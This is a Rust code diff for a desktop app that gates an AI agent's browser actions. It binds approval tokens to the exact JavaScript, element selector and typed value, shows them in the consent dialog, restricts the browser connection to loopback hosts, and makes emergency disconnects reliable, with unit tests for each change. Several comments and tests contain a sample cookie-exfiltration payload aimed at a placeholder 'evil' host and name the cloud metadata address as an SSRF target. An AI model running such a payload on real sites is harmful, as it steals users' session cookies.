@@ -867,17 +867,32 @@ struct ActionDetail {
     /// approval for one flag-set can't launch a different one (TS binds `args`;
     /// same silently-dropped-field gap as `url`).
     args: Option<Vec<String>>,
+    /// browser.eval: the JS the token authorizes. Bound into the token (an approval
+    /// for js='X' can't be spent on js='Y') AND shown in the native dialog so the
+    /// human sees what will actually run — but NEVER written to the audit ledger
+    /// (the length-only `summary` is what lands there). Dialog visibility and ledger
+    /// privacy are DELIBERATELY separate surfaces (S-012 consent vs redacted trail).
+    js: Option<String>,
+    /// browser.interact: the element selector + typed value + interact kind. Bound
+    /// into the token (an approval for one selector/value can't be swapped) AND
+    /// shown in the dialog; the RAW value (a possible password) never enters the
+    /// ledger — same dialog-vs-ledger split as `js`.
+    selector: Option<String>,
+    value: Option<String>,
+    interact_kind: Option<String>,
 }
 
 impl ActionDetail {
     /// Stable binding key so a token issued for action A can't authorize B.
-    /// `url` + `args` are included so a browser.navigate token is bound to its
-    /// exact URL and a pty.spawn token to its exact flag-set — matching the TS
-    /// governance bindingKey. request_action and consume_action build the binding
-    /// from the SAME struct, so adding the fields keeps host mint/consume in step.
+    /// `url` + `args` bind a browser.navigate token to its exact URL and a pty.spawn
+    /// token to its exact flag-set; `js` + `selector`/`value`/`interact_kind` bind a
+    /// browser.eval / browser.interact token to its exact code / target — so an
+    /// approval for eval('X') can't be spent on eval('Y'), matching the TS governance
+    /// bindingKey. request_action and consume_action build the binding from the SAME
+    /// struct, so adding the fields keeps host mint/consume in step.
     fn binding(&self, kind: &str) -> String {
         format!(
-            "{kind}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}",
+            "{kind}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}",
             self.argv,
             self.cwd,
             self.path,
@@ -886,7 +901,11 @@ impl ActionDetail {
             self.vendor,
             self.provider,
             self.url,
-            self.args
+            self.args,
+            self.js,
+            self.selector,
+            self.value,
+            self.interact_kind
         )
     }
     fn summary_or(&self, kind: &str) -> String {
@@ -921,6 +940,29 @@ impl ActionDetail {
         // token binds to, not the webview's free-text summary.
         if let Some(url) = &self.url {
             lines.push(format!("URL: {}", sanitize_field(url)));
+        }
+        // browser.eval — the EXACT JS the token authorizes. Shown here (ephemeral
+        // native dialog) so a blind "Action: browser.eval" can't hide
+        // `location.href='https://evil/'+document.cookie`; the ledger still keeps
+        // only a length-only summary, never this source. Gated on kind so a stray
+        // `js` field on another action can't inject a dialog line.
+        if kind == "browser.eval" {
+            if let Some(js) = &self.js {
+                lines.push(format!("JS: {}", sanitize_field(js)));
+            }
+        }
+        // browser.interact — the EXACT kind + selector (+ typed value) the token
+        // authorizes, so the human sees what will be clicked/typed rather than a
+        // bare "Action: browser.interact". Same ephemeral-dialog vs redacted-ledger
+        // split: the raw value is shown here but never persisted.
+        if kind == "browser.interact" {
+            let k = self.interact_kind.as_deref().unwrap_or("");
+            let sel = self.selector.as_deref().unwrap_or("");
+            let mut line = format!("Interact: {} {}", sanitize_field(k), sanitize_field(sel));
+            if let Some(v) = &self.value {
+                line.push_str(&format!(" = {}", sanitize_field(v)));
+            }
+            lines.push(line);
         }
         if let Some(server) = &self.server {
             lines.push(format!("Server: {}", sanitize_field(server)));
@@ -1829,13 +1871,133 @@ struct BrowserResult {
     error: Option<String>,
 }
 
-/// The host-owned CDP connection (at most one active session). Behind a std Mutex
-/// that is NEVER held across an await: `browser_dispatch` takes the connection OUT,
-/// drives it async, and puts it back — so there is no async-lock hazard, and a
-/// second concurrent dispatch simply finds no connection (the browser is a
-/// single-session surface).
+/// The host-owned CDP session (at most one active connection). ALL of {connection,
+/// in-flight marker, pending-disconnect request} live behind ONE Mutex, and that
+/// Mutex is NEVER held across an await: `browser_dispatch` takes the connection OUT
+/// (marking in-flight), drives it async, then re-locks to put it back. Keeping the
+/// three fields under one lock makes the emergency-disconnect race-free — whichever
+/// of {disconnect, dispatch-finish} locks second sees the other's committed state
+/// (an atomics-only design would race: disconnect could flag a session that a just-
+/// completed dispatch had already put back, wrongly dropping the NEXT one).
 #[derive(Default)]
-struct BrowserHostState(Mutex<Option<browser::CdpConnection>>);
+struct BrowserSession {
+    conn: Option<browser::CdpConnection>,
+    /// A dispatch currently holds `conn` OUT (so `conn` is None but a session lives).
+    in_flight: bool,
+    /// disconnect() was called while a dispatch was in-flight — honour it when the
+    /// dispatch finishes (drop the connection, never revive the closed session).
+    disconnect_requested: bool,
+}
+
+#[derive(Default)]
+struct BrowserHostState(Mutex<BrowserSession>);
+
+/// What an explicit disconnect did — the caller audits accordingly.
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+enum DisconnectOutcome {
+    /// A connected session was dropped immediately.
+    Dropped,
+    /// A dispatch is in-flight; the drop is deferred to its completion (emergency
+    /// stop is HONOURED, not silently no-op'd).
+    DeferredInFlight,
+    /// Nothing was connected — a genuine no-op.
+    Nothing,
+}
+
+/// Pure decision for `request_disconnect` from the observable session state. Split
+/// out so the P2-3 emergency-stop invariant is unit-testable without a live
+/// CdpConnection. A present connection is dropped immediately; otherwise an
+/// in-flight dispatch defers the drop; otherwise it is a genuine no-op.
+fn disconnect_decision(conn_present: bool, in_flight: bool) -> DisconnectOutcome {
+    if conn_present {
+        DisconnectOutcome::Dropped
+    } else if in_flight {
+        DisconnectOutcome::DeferredInFlight
+    } else {
+        DisconnectOutcome::Nothing
+    }
+}
+
+/// Pure decision for `end_dispatch`: `(put_back, honored)`. A disconnect requested
+/// while the dispatch held the connection out ALWAYS wins — the connection is not
+/// put back (the closed session must never revive), regardless of `keep`. Also
+/// unit-testable without a live CdpConnection.
+fn end_dispatch_decision(keep: bool, disconnect_requested: bool) -> (bool, bool) {
+    let honored = disconnect_requested;
+    let put_back = keep && !honored;
+    (put_back, honored)
+}
+
+impl BrowserHostState {
+    /// Take the connection OUT for a dispatch, marking it in-flight. `Ok(None)` when
+    /// no session is connected (the caller errors without burning a token). Brief
+    /// lock — never held across the async drive.
+    fn begin_dispatch(&self) -> Result<Option<browser::CdpConnection>, String> {
+        let mut s = self.0.lock().map_err(|_| "browser state poisoned")?;
+        match s.conn.take() {
+            Some(c) => {
+                s.in_flight = true;
+                Ok(Some(c))
+            }
+            None => Ok(None),
+        }
+    }
+
+    /// Release the connection at the end of a dispatch. `keep` = the session is still
+    /// usable (put it back) vs dead (drop it — e.g. a transport failure). A
+    /// disconnect requested WHILE this dispatch held the connection out WINS: the
+    /// connection is dropped (never revived) regardless of `keep`. Returns true iff a
+    /// pending disconnect was honoured, so the caller can audit it. On a poisoned
+    /// lock the connection is dropped and the session ends — fail-closed.
+    fn end_dispatch(&self, conn: browser::CdpConnection, keep: bool) -> bool {
+        match self.0.lock() {
+            Ok(mut s) => {
+                s.in_flight = false;
+                let requested = std::mem::take(&mut s.disconnect_requested);
+                let (put_back, honored) = end_dispatch_decision(keep, requested);
+                if put_back {
+                    s.conn = Some(conn);
+                }
+                // else → `conn` is dropped here (session ended / not revived)
+                honored
+            }
+            Err(_) => false, // poisoned → conn dropped, session stays None (fail-closed)
+        }
+    }
+
+    /// Explicit disconnect. Drops a connected session immediately; if a dispatch is
+    /// in-flight, records the request so `end_dispatch` drops the connection on
+    /// completion (the closed session must NOT revive). Never sets the flag when
+    /// nothing is connected — otherwise it would wrongly drop the NEXT dispatch's
+    /// fresh connection.
+    fn request_disconnect(&self) -> DisconnectOutcome {
+        match self.0.lock() {
+            Ok(mut s) => {
+                let outcome = disconnect_decision(s.conn.is_some(), s.in_flight);
+                match outcome {
+                    DisconnectOutcome::Dropped => {
+                        s.conn = None;
+                    }
+                    DisconnectOutcome::DeferredInFlight => {
+                        s.disconnect_requested = true;
+                    }
+                    DisconnectOutcome::Nothing => {}
+                }
+                outcome
+            }
+            Err(_) => DisconnectOutcome::Nothing,
+        }
+    }
+
+    /// Store a freshly-opened connection (browser_connect). Clears any stale
+    /// disconnect request so a new session isn't torn down by an old emergency stop.
+    fn set_connection(&self, conn: browser::CdpConnection) -> Result<(), String> {
+        let mut s = self.0.lock().map_err(|_| "browser state poisoned")?;
+        s.conn = Some(conn);
+        s.disconnect_requested = false;
+        Ok(())
+    }
+}
 
 /// op → governance ActionKind (mirror of src/browser.ts OP_KIND / opToKind).
 fn browser_op_to_kind(op: &str) -> Option<&'static str> {
@@ -1916,8 +2078,9 @@ async fn browser_discover(port: u16) -> Result<String, String> {
 }
 
 /// Open the single CDP page-target connection. Not per-se gated (per-action gates
-/// cover every side effect), but AUDITED, and restricted to a ws(s) endpoint so it
-/// can't be pointed at http/file/etc.
+/// cover every side effect), but AUDITED, and restricted to a LOOPBACK ws(s)
+/// endpoint so a compromised webview can't point the host at `ws://169.254.169.254`
+/// (cloud metadata) or a LAN browser — symmetric with discovery's loopback pin.
 #[tauri::command]
 async fn browser_connect(
     app: AppHandle,
@@ -1927,37 +2090,49 @@ async fn browser_connect(
     ts: Option<u64>,
 ) -> Result<(), String> {
     let ts = ts.unwrap_or(0);
-    let lower = cdp_url.trim().to_ascii_lowercase();
-    if !(lower.starts_with("ws://") || lower.starts_with("wss://")) {
+    let url = cdp_url.trim();
+    let audit_deny = |reason: &str| {
         if let Ok(mut gate) = gov.0.lock() {
-            audit_append(&app, &mut gate, "browser.connect", "-", "denied", "non-ws CDP endpoint blocked", ts);
+            audit_append(&app, &mut gate, "browser.connect", "-", "denied", reason, ts);
         }
+    };
+    let lower = url.to_ascii_lowercase();
+    if !(lower.starts_with("ws://") || lower.starts_with("wss://")) {
+        audit_deny("non-ws CDP endpoint blocked");
         return Err("CDP endpoint must be a ws:// or wss:// URL".into());
     }
-    // Connect BEFORE taking the state lock (never hold a lock across an await).
-    let conn = browser::CdpConnection::connect(cdp_url.trim()).await?;
-    {
-        let mut guard = state.0.lock().map_err(|_| "browser state poisoned")?;
-        *guard = Some(conn);
+    // P2-2 SSRF / loopback-escape guard — the endpoint host must be loopback.
+    if !browser::is_loopback_ws_host(url) {
+        audit_deny("non-loopback CDP host blocked");
+        return Err("CDP endpoint host must be loopback (127.0.0.1 / ::1 / localhost)".into());
     }
+    // Connect BEFORE taking the state lock (never hold a lock across an await).
+    let conn = browser::CdpConnection::connect(url).await?;
+    state.set_connection(conn)?;
+    // P3-3: record the (redacted) endpoint host so a connect leaves an SSRF trail.
+    let host = browser::ws_host(url).unwrap_or_default();
     if let Ok(mut gate) = gov.0.lock() {
-        audit_append(&app, &mut gate, "browser.connect", "-", "success", "browser connected", ts);
+        audit_append(&app, &mut gate, "browser.connect", "-", "success", &format!("browser connected to {host}"), ts);
     }
     Ok(())
 }
 
 /// Drop the active CDP connection (dropping the socket closes it). Safe direction —
-/// no approval needed; audited when a live session was actually torn down.
+/// no approval needed. If a dispatch is in-flight (the connection is held OUT), the
+/// drop is DEFERRED to that dispatch's completion so the closed session can't
+/// revive — an emergency stop is honoured, never a silent no-op. Audited in every
+/// case except a genuine nothing-connected no-op.
 #[tauri::command]
 fn browser_disconnect(app: AppHandle, gov: State<'_, Governance>, state: State<'_, BrowserHostState>, ts: Option<u64>) -> Result<(), String> {
     let ts = ts.unwrap_or(0);
-    let had = {
-        let mut guard = state.0.lock().map_err(|_| "browser state poisoned")?;
-        guard.take().is_some()
+    let summary = match state.request_disconnect() {
+        DisconnectOutcome::Dropped => Some("browser disconnected"),
+        DisconnectOutcome::DeferredInFlight => Some("disconnect requested during in-flight action"),
+        DisconnectOutcome::Nothing => None, // nothing connected — no-op, nothing to audit
     };
-    if had {
+    if let Some(summary) = summary {
         if let Ok(mut gate) = gov.0.lock() {
-            audit_append(&app, &mut gate, "browser.connect", "-", "success", "browser disconnected", ts);
+            audit_append(&app, &mut gate, "browser.connect", "-", "success", summary, ts);
         }
     }
     Ok(())
@@ -1995,6 +2170,12 @@ async fn browser_dispatch(
             audit_append(&app, &mut gate, kind, "-", outcome, summary, ts);
         }
     };
+    // Audit an in-flight disconnect that was honoured on this dispatch's completion.
+    let audit_disconnect_honored = || {
+        if let Ok(mut gate) = gov.0.lock() {
+            audit_append(&app, &mut gate, "browser.connect", "-", "success", "disconnect honored after in-flight action", ts);
+        }
+    };
 
     // ── HOST-side HARD-DENY — before the token is spent ──
     // navigate off http/https would pivot the agent off the web into the local
@@ -2006,53 +2187,92 @@ async fn browser_dispatch(
         return Err("non-http(s) navigation blocked".into());
     }
 
-    // Take the connection OUT first — a missing connection must NOT burn the token.
-    let mut conn = {
-        let mut guard = state.0.lock().map_err(|_| "browser state poisoned")?;
-        match guard.take() {
-            Some(c) => c,
-            None => return Err("no active browser connection (call browser_connect first)".into()),
-        }
+    // Take the connection OUT (marking in-flight) — a missing connection must NOT
+    // burn the token, and begin_dispatch takes NOTHING out on that path.
+    let mut conn = match state.begin_dispatch()? {
+        Some(c) => c,
+        None => return Err("no active browser connection (call browser_connect first)".into()),
     };
 
     // Spend the one-time token, bound EXACTLY as browserActionToGate minted it:
-    // navigate binds the url; read/interact/eval bind no extra fields.
-    let detail = if kind == "browser.navigate" {
-        ActionDetail { url: action.url.clone(), ..Default::default() }
-    } else {
-        ActionDetail::default()
+    // navigate binds the url; eval binds the js; interact binds kind+selector+value;
+    // read binds no extra fields. Binding to js/value closes the "one approval →
+    // arbitrary code/target" gap (an eval('X') approval can't be spent on eval('Y')).
+    let detail = match kind {
+        "browser.navigate" => ActionDetail { url: action.url.clone(), ..Default::default() },
+        "browser.eval" => ActionDetail { js: action.js.clone(), ..Default::default() },
+        "browser.interact" => ActionDetail {
+            interact_kind: action.kind.clone(),
+            selector: action.selector.clone(),
+            value: action.value.clone(),
+            ..Default::default()
+        },
+        _ => ActionDetail::default(),
     };
     let binding = detail.binding(kind);
-    {
-        let mut gate = gov.0.lock().map_err(|_| "browser state poisoned")?;
-        if !try_consume_token(&mut gate, &token, kind, &binding) {
-            audit_append(&app, &mut gate, kind, "-", "replay-rejected", kind, ts);
-            drop(gate);
-            // A bad token must not drop a live session — put the connection back.
-            let mut guard = state.0.lock().map_err(|_| "browser state poisoned")?;
-            *guard = Some(conn);
-            return Err("invalid or already-spent token".into());
+    let consumed = match gov.0.lock() {
+        Ok(mut gate) => {
+            if try_consume_token(&mut gate, &token, kind, &binding) {
+                true
+            } else {
+                audit_append(&app, &mut gate, kind, "-", "replay-rejected", kind, ts);
+                false
+            }
         }
+        // gov lock poisoned — the session is fine and the action never ran; put the
+        // connection back (fail-closed, no leak) rather than dropping it.
+        Err(_) => {
+            if state.end_dispatch(conn, true) {
+                audit_disconnect_honored();
+            }
+            return Err("gate poisoned".into());
+        }
+    };
+    if !consumed {
+        // A bad token must not drop a live session — put the connection back (unless
+        // a disconnect was requested while it was held out, which wins).
+        if state.end_dispatch(conn, true) {
+            audit_disconnect_honored();
+        }
+        return Err("invalid or already-spent token".into());
     }
 
     // consumed audit — op-scoped, REDACTED, never the raw value/js.
     audit_browser("consumed", &browser_audit_summary(&action));
 
     // Drive the page. A transport/protocol failure (Err) invalidates the session →
-    // the connection is DROPPED here (forcing a reconnect); a page-level result (Ok)
-    // — including a driver `{ok:false, error}` — keeps the session alive → put it back.
+    // the connection is DROPPED (forcing a reconnect); a page-level result (Ok) —
+    // including a driver `{ok:false, error}` — keeps the session alive → put it back
+    // (unless an in-flight disconnect was requested, which drops it either way).
     match browser_drive(&mut conn, kind, &action).await {
         Ok(value) => {
-            {
-                let mut guard = state.0.lock().map_err(|_| "browser state poisoned")?;
-                *guard = Some(conn);
+            // P3-2: a navigate that LANDED off http(s) (a redirect to file:/chrome:/…)
+            // is a policy escape — drop the session + report failure. Chrome blocks
+            // cross-scheme redirects, but this is defense-in-depth at the host.
+            if kind == "browser.navigate" {
+                let landed_ok = value.as_str().map(|u| browser::is_safe_http_url(Some(u))).unwrap_or(false);
+                if !landed_ok {
+                    let honored = state.end_dispatch(conn, false); // dead session — drop
+                    audit_browser("error", "navigate redirected off http(s)");
+                    if honored {
+                        audit_disconnect_honored();
+                    }
+                    return Ok(BrowserResult { ok: false, value: None, error: Some("navigation redirected off http(s)".into()) });
+                }
             }
+            let honored = state.end_dispatch(conn, true);
             audit_browser("success", &browser_audit_summary(&action));
+            if honored {
+                audit_disconnect_honored();
+            }
             Ok(BrowserResult { ok: true, value: Some(value), error: None })
         }
         Err(e) => {
-            // conn dropped (not put back) — a broken session forces a fresh connect.
+            let honored = state.end_dispatch(conn, false); // transport failure — drop
             audit_browser("error", "browser action failed");
+            if honored {
+                audit_disconnect_honored();
+            }
             Ok(BrowserResult { ok: false, value: None, error: Some(e) })
         }
     }
@@ -3107,25 +3327,101 @@ mod governance_tests {
     }
 
     #[test]
-    fn browser_dispatch_binding_matches_browser_action_to_gate() {
-        // navigate binds its EXACT url (a bank.com approval can't drive evil.com);
-        // read/interact/eval bind NO extra fields (the raw selector/value/js are not
-        // part of governance) — so their binding is the bare kind, matching the TS
-        // browserActionToGate + bindingKey (which set only `summary`, never bound).
+    fn browser_navigate_token_is_url_bound() {
+        // navigate binds its EXACT url (a bank.com approval can't drive evil.com).
         let bank = ActionDetail { url: Some("https://bank.com".into()), ..Default::default() };
         let evil = ActionDetail { url: Some("https://evil.com".into()), ..Default::default() };
         assert_ne!(bank.binding("browser.navigate"), evil.binding("browser.navigate"));
 
-        // A token minted for navigate(bank.com) cannot be spent to reach evil.com.
         let mut gate = GateState::default();
         seed_token(&mut gate, "tok-nav", "browser.navigate", &bank.binding("browser.navigate"));
         assert!(!try_consume_token(&mut gate, "tok-nav", "browser.navigate", &evil.binding("browser.navigate")));
         assert!(try_consume_token(&mut gate, "tok-nav", "browser.navigate", &bank.binding("browser.navigate")));
+    }
 
-        // read/interact/eval bind identically to the default (all fields null).
-        let empty = ActionDetail::default();
-        assert_eq!(empty.binding("browser.read"), ActionDetail::default().binding("browser.read"));
-        assert_eq!(empty.binding("browser.eval"), ActionDetail::default().binding("browser.eval"));
+    #[test]
+    fn browser_eval_token_is_js_bound() {
+        // P2-1: a browser.eval approval is bound to its EXACT JS — so an approval for
+        // `1+1` can't be spent to run `location.href='https://evil/'+document.cookie`
+        // (the old design let ONE eval approval run arbitrary JS, bypassing url-bind).
+        let benign = ActionDetail { js: Some("1+1".into()), ..Default::default() };
+        let evil = ActionDetail { js: Some("location.href='https://evil/'+document.cookie".into()), ..Default::default() };
+        assert_ne!(benign.binding("browser.eval"), evil.binding("browser.eval"));
+
+        let mut gate = GateState::default();
+        seed_token(&mut gate, "tok-eval", "browser.eval", &benign.binding("browser.eval"));
+        assert!(!try_consume_token(&mut gate, "tok-eval", "browser.eval", &evil.binding("browser.eval")));
+        assert!(try_consume_token(&mut gate, "tok-eval", "browser.eval", &benign.binding("browser.eval")));
+    }
+
+    #[test]
+    fn browser_interact_token_is_kind_selector_value_bound() {
+        // P2-1: a browser.interact approval is bound to kind+selector+value — so an
+        // approval to click #ok can't be swapped to click #confirm-delete, nor a
+        // typed value swapped after approval.
+        let base = ActionDetail {
+            interact_kind: Some("type".into()),
+            selector: Some("#search".into()),
+            value: Some("cats".into()),
+            ..Default::default()
+        };
+        let diff_selector = ActionDetail { selector: Some("#password".into()), ..base.clone() };
+        let diff_value = ActionDetail { value: Some("dogs".into()), ..base.clone() };
+        let diff_kind = ActionDetail { interact_kind: Some("click".into()), ..base.clone() };
+        assert_ne!(base.binding("browser.interact"), diff_selector.binding("browser.interact"));
+        assert_ne!(base.binding("browser.interact"), diff_value.binding("browser.interact"));
+        assert_ne!(base.binding("browser.interact"), diff_kind.binding("browser.interact"));
+
+        // read still binds no extra fields (bare kind).
+        assert_eq!(ActionDetail::default().binding("browser.read"), ActionDetail::default().binding("browser.read"));
+    }
+
+    #[test]
+    fn browser_dialog_shows_the_exact_js_and_interact_not_a_blind_action() {
+        // P2-1 consent gap: the native dialog must show WHAT eval/interact will run,
+        // not a bare "Action: browser.eval". (Ledger privacy is a SEPARATE surface —
+        // see browser_audit_summary_never_leaks_*.)
+        let evaled = ActionDetail { js: Some("location.href='https://evil/'+document.cookie".into()), ..Default::default() };
+        let te = evaled.enforced_dialog_text("browser.eval");
+        assert!(te.contains("JS:"), "the dialog must surface a JS line");
+        assert!(te.contains("document.cookie"), "the dialog must show the real code: {te}");
+
+        let typed = ActionDetail {
+            interact_kind: Some("type".into()),
+            selector: Some("#password".into()),
+            value: Some("hunter2".into()),
+            ..Default::default()
+        };
+        let ti = typed.enforced_dialog_text("browser.interact");
+        assert!(ti.contains("Interact: type #password"), "dialog shows kind+selector: {ti}");
+        assert!(ti.contains("hunter2"), "dialog shows the exact typed value (ephemeral consent): {ti}");
+    }
+
+    // ── P2-3: disconnect during an in-flight dispatch must not silently no-op, and
+    //          the closed session must NOT revive when the dispatch finishes ──
+
+    #[test]
+    fn disconnect_decision_defers_only_when_in_flight() {
+        // A present connection is dropped immediately.
+        assert_eq!(disconnect_decision(true, false), DisconnectOutcome::Dropped);
+        // No connection but a dispatch is in-flight → DEFER (emergency stop honoured,
+        // not a silent no-op).
+        assert_eq!(disconnect_decision(false, true), DisconnectOutcome::DeferredInFlight);
+        // Nothing connected, nothing in-flight → genuine no-op (must NOT set a flag
+        // that would drop the NEXT dispatch's fresh connection).
+        assert_eq!(disconnect_decision(false, false), DisconnectOutcome::Nothing);
+    }
+
+    #[test]
+    fn end_dispatch_honors_a_deferred_disconnect_over_keep() {
+        // Normal completion, no disconnect → put the (usable) connection back.
+        assert_eq!(end_dispatch_decision(true, false), (true, false));
+        // A disconnect requested WHILE in-flight WINS: do NOT put the connection back
+        // (the closed session must not revive), and report it as honoured.
+        assert_eq!(end_dispatch_decision(true, true), (false, true));
+        // A dead session (transport failure) is dropped regardless.
+        assert_eq!(end_dispatch_decision(false, false), (false, false));
+        assert_eq!(end_dispatch_decision(false, true), (false, true));
     }
 
     #[test]
